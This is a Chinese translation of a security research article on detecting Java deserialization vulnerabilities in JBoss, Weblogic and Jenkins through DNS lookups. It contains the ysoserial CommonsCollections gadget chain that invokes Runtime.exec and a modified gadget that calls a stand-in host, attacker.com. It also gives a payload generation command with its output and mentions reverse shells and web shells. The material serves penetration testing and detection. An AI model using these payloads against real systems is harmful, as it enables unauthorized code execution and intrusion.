> 原文链接: https://www.anquanke.com//post/id/85793 


# 【技术分享】通过泄露到DNS的信息检测反序列化漏洞（含演示视频）


                                阅读量   
                                **127799**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：安全客
                                <br>原文地址：[http://gosecure.net/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/](http://gosecure.net/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p0.ssl.qhimg.com/t0169262402e6ea2566.jpg)](https://p0.ssl.qhimg.com/t0169262402e6ea2566.jpg)**

****

翻译：[pwn_361](http://bobao.360.cn/member/contribute?uid=2798962642)

稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**前言**

此刻，JAVA反序列化漏洞正在被厂商和攻击者所熟知。渗透测试人员今后还会遇到这种类型的漏洞。使用当前的一些小工具可以识别出这些漏洞，不过，大多数可用的小工具依赖于命令执行API。由于目标操作系统环境限制条件存在区别，因此，有效载荷的命令在目标系统中执行时，不一定会每次都成功。另外，在目标系统中，载荷所使用的命令也有可能不存在，或者载荷所要求的参数可能因命令的版本或安装的环境而有所不同(以GUN的netcat VS OpenBSD的netcat为例)。

由于在部分目标系统环境中存在上面提到的关于执行命令的一些限制，要想探测出这些漏洞就需要更多的试验和错误，对于目标，可能需要发送多个有效载荷，这使得自动化探测更加困难。制作一个通用的有效载荷，将会简化大规模反序列化漏洞的探测过程。在介绍我们的扫描方法之前，让我们为“更可靠的有效载荷”定义一个具体的实现目标。

<br>

**目标**

1.使有效载荷和具体的操作系统无关，如Windows、Ubuntu、Alpine Linux (Docker)、Solaris、AIX等系统。

2.即使目标的WEB容器运行在安全管理器或沙盒中，也能探测到发生的事情。

3.支持最常见的JVM1.6+版本，和可能的1.5*版本。

[YSoSerial](https://github.com/frohoff/ysoserial)生成的大多数载荷都符合这些条件。

[![](https://p0.ssl.qhimg.com/t019ec7ebb28033c491.png)](https://p0.ssl.qhimg.com/t019ec7ebb28033c491.png)

<br>

**示例场景**

GoSecure的渗透测试小组遇到过几个需要对当前的小工具(或者称为载荷、组件)做一些修改的案例。例如，发现了一个旧的JBoss实例，并且对外开放了JMXInvokerServlet接口。根据它的版本，我们预计它应该存在可利用的漏洞。但是令人惊讶的是，我们利用所有已知的漏洞测试工具对这个JBoss实例进行测试，但是都失败了。

这些测试工具的失败意味着存在两种可能性：一是这些小工具在这个特定的环境中不起作用，二是目标系统已经打了补丁。然而，我们利用一个简单的有效载荷(就是后面我们创建的DNS解析载荷)做了一个DNS查询，证实了目标系统确实存在相应漏洞。基于这个事实，我们认为，为了避免使用命令执行API，创建一个替代的小工具是有必要的。

<br>

**创建一个DNS小工具**

为了确认目标是否存在漏洞，我们将对YSoSerial(frohoff/ysoserial、未修改)的一个已经存在的小工具进行修改。我们将使用一个简单的代码代替命令执行载荷，该代码将触发一个DNS解析。

Ysoserial中最常用的一个有效载荷是“Commons Collection”。其中，“Transformer”链会触发下面的代码：

Transformer链(使用了命令执行载荷)：



```
final Transformer[] transformers = new Transformer[] `{`
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[] `{`String.class, Class[].class `}`, new Object[] `{`"getRuntime", new Class[0] `}`),
    new InvokerTransformer("invoke", new Class[] `{`Object.class, Object[].class `}`, new Object[] `{`null, new Object[0] `}`),
    new InvokerTransformer("exec", new Class[] `{` String.class `}`, execArgs),
    new ConstantTransformer(1) `}`;
```

触发的代码：

```
((Runtime) Runtime.class.getMethod("getRuntime", new Class[0]).invoke(new Class[]`{` Object.class, Object.class`}`,new Object[0])).exec("echo your command here");
```

上面是未经修改的Ysoserial的代码，为了不使用命令执行API，我们对它进行必要的修改。同时，我们不能使用“nslookup”命令来触发DNS解析，因为我们要避免使用命令执行API。为此，我们将直接使用java API。

下面是我们修改过的Transformer链(使用了DNS解析载荷)：

```
new URL("http://resolve-me-aaaa.attacker.com").openConnection().getInputStream().read();
```



**确认目标是否存在漏洞**

如下图，我们利用Ysoserial(修改过的)生成了一个能解析独特主机名的一个载荷(或者称为配件、小工具)。将载荷发送给目标服务器后，如果服务器处理了任何反序列化，这个独特名称就可以作为追踪的方法。服务器可能会多次评估这个漏洞，或带有一些延时。使用独特主机名可以避免有可能产生的混淆，特别是当扫描多个主机时。在[我们的ysoserial分支](https://github.com/GoSecure/ysoserial)(GoSecure/ysoserial、已修改)中，已经有可用的完整POC代码。如下图，生成载荷：



```
$ java -jar ysoserial-0.0.5-SNAPSHOT-all.jar CommonsCollections1Dns http://resolve-me-aaaa.attacker.com | xxd
00000000: aced 0005 7372 0032 7375 6e2e 7265 666c ....sr.2sun.refl
00000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41 ect.annotation.A
00000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174 nnotationInvocat
00000030: 696f 6e48 616e 646c 6572 55ca f50f 15cb ionHandlerU.....
00000040: 7ea5 0200 024c 000c 6d65 6d62 6572 5661 ~....L..memberVa
00000050: 6c75 6573 7400 0f4c 6a61 7661 2f75 7469 luest..Ljava/uti
00000060: 6c2f 4d61 703b 4c00 0474 7970 6574 0011 l/Map;L..typet..
00000070: 4c6a 6176 612f 6c61 6e67 2f43 6c61 7373 Ljava/lang/Class
00000080: 3b78 7073 7d00 0000 0100 0d6a 6176 612e ;xps`}`......java.
00000090: 7574 696c 2e4d 6170 7872 0017 6a61 7661 util.Mapxr..java
000000a0: 2e6c 616e 672e 7265 666c 6563 742e 5072 .lang.reflect.Pr
000000b0: 6f78 79e1 27da 20cc 1043 cb02 0001 4c00 oxy.'. ..C....L.
000000c0: 0168 7400 254c 6a61 7661 2f6c 616e 672f .ht.%Ljava/lang/
000000d0: 7265 666c 6563 742f 496e 766f 6361 7469 reflect/Invocati
000000e0: 6f6e 4861 6e64 6c65 723b 7870 7371 007e onHandler;xpsq.~
[...]
```

向目标系统发送载荷后，如果在我们配置的DNS服务器上收到了一个相应的DNS查询请求，那么就可以确认目标存在漏洞。为了记录DNS查询请求，我们可以利用很多工具，如 [DNS chef](http://thesprawl.org/projects/dnschef/)，[Burp Collaborator](https://portswigger.net/burp/help/collaborator.html)或[tcpdump](https://jontai.me/blog/2011/11/monitoring-dns-queries-with-tcpdump/)。在下面的样本中，我们使用DNS Chef来记录查询请求，可以看到DNS查询请求成功到达测试服务器。



```
# python dnschef.py -q --fakeip 127.0.0.1 -i 0.0.0.0
[*] DNSChef started on interface: 0.0.0.0
[*] Using the following nameservers: 8.8.8.8
[*] Cooking all A replies to point to 127.0.0.1
[12:16:05] 74.125.X.X: cooking the response of type 'A' for resolve-me-aaaa.attacker.com to 127.0.0.1
[12:16:05] 192.221.X.X: cooking the response of type 'A' for resolve-me-aaaa.attacker.com to 127.0.0.1
```

下图是这种异步扫描方法的直观表示图：

[![](https://p4.ssl.qhimg.com/t01239020b3b7a03854.png)](https://p4.ssl.qhimg.com/t01239020b3b7a03854.png)

<br>

**其他考虑**

一旦确认目标存在漏洞，渗透测试人员为了得到一个SHELL，需要继续做一些试验、或触发一些错误命令。关于这个工作，有一些有用的技巧：

1.确保你已经测试了一些反向SHELL命令(查看[Reverse Shell Cheat-Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet))。

2.“Common collection”载荷在某些特定的JVM中可能会失败(如IBM J9)。Mathias Kaiser制作了一个特殊的载荷，支持这个不常见的JVM，[详情请看CommonsCollections6](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java)。

3.如果目标强制执行了一个安全管理器，你可能需要制作一个自定义的小工具。你可以通过“[DEADCODE’s blog article](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)”去了解transformer链的大致情况。一种流行的方法是找到Web根目录的路径，并编写一个可以稍后执行的web shell。关于此，[在GoSecure仓库](https://github.com/GoSecure/ysoserial/tree/master/src/main/java/ysoserial/payloads)中有一些样本工具。再说一次，如果目标环境中的安全管理器会阻止命令执行，才会需要这些工具。

<br>

**演示视频**

我们创建了一个异步反序列化漏洞扫描工具“[Break Fast Serial](https://github.com/GoSecure/break-fast-serial)”，对DNS Chef也做了一点修改，下面是该工具的简要演示。演示了对单个目标的扫描。DNS泄漏的信息证明了这个服务器存在反序列化漏洞。该工具还支持对多个IP、端口进行扫描。该扫描器将对JBoss，Weblogic和Jenkins易受攻击的版本进行探测。对于如何配置DNS Chef服务器、如何生成载荷，及更多其它详细信息，请阅读[参考手册](https://github.com/GoSecure/break-fast-serial#mass-scan)，及相应POC代码。



<br>

**结论**

泄漏到DNS的信息有利于以下三个方面：

1.它可以实现反序列化漏洞的探测。

2.它有利于自动扫描多个主机。

3.即使目标服务器存在严格的防火墙限制，它也能识别出存在的漏洞。

我们发布了一款异步的[自动扫描器](https://github.com/GoSecure/break-fast-serial)，该扫描器能对JBoss，Weblogic和Jenkins易受攻击的版本进行探测。今后，我们会有计划的支持其他服务、框架。我们邀请测试者参与到这个开发过程中，这种更广泛和更快的方法，对防御者早期检测出反序列化漏洞很有帮助。

这篇文章主要关注了“CommonsCollection”载荷，但是我们建立小工具所使用的API也适用于其他载荷。同样的规则也适用于探测其他漏洞，如最近出现了[Struts漏洞](https://struts.apache.org/docs/s2-045.html)。

<br>

**参考**

[AppSecCali 2015: Marshalling Pickles](https://frohoff.github.io/appseccali-marshalling-pickles/)

[Blind Java Deserialization](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)

[Blind-Java-Deserialization-Part-II](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
